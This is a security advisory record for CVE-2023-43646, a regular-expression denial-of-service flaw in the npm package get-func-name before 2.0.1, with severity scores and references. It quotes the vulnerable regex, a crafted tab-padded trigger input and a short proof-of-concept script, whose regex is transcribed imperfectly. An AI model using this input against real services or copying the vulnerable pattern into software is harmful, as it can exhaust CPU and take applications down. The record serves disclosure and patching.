advisory_id: GHSA-4q6p-r6v2-jvc5
datasource_id: github_osv_importer_v2/GHSA-4q6p-r6v2-jvc5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/09/GHSA-4q6p-r6v2-jvc5/GHSA-4q6p-r6v2-jvc5.json
aliases:
  - CVE-2023-43646
summary: |
  Chaijs/get-func-name vulnerable to ReDoS
  The current regex implementation for parsing values in the module is susceptible to excessive backtracking, leading to potential DoS attacks. The regex implementation in question is as follows:

  ```js
  const functionNameMatch = /\s*function(?:\s|\s*\/\*[^(?:*/)]+\*\/\s*)*([^\s(/]+)/;
  ```

  This vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:

  ```js
  '\t'.repeat(54773) + '\t/function/i'
  ```

  Here is a simple PoC code to demonstrate the issue:

  ```js
  const protocolre = /\sfunction(?:\s|\s/*[^(?:*\/)]+*/\s*)*([^\(\/]+)/;

  const startTime = Date.now();
  const maliciousInput = '\t'.repeat(54773) + '\t/function/i'

  protocolre.test(maliciousInput);

  const endTime = Date.now();

  console.log("process time: ", endTime - startTime, "ms");
  ```
impacted_packages:
  - purl: pkg:npm/get-func-name
    affected_versions: vers:npm/<2.0.1
    fixed_versions: vers:npm/2.0.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/09/GHSA-4q6p-r6v2-jvc5/GHSA-4q6p-r6v2-jvc5.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1333
  - CWE-400
references:
  - url: https://github.com/chaijs/get-func-name
    reference_type:
    reference_id:
  - url: https://github.com/chaijs/get-func-name/blob/78ad756441a83f3dc203e50f76c113ae3ac017dc/index.js#L15
    reference_type:
    reference_id:
  - url: https://github.com/chaijs/get-func-name/commit/f934b228b5e2cb94d6c8576d3aac05493f667c69
    reference_type:
    reference_id:
  - url: https://github.com/chaijs/get-func-name/security/advisories/GHSA-4q6p-r6v2-jvc5
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-43646
    reference_type:
    reference_id: CVE-2023-43646
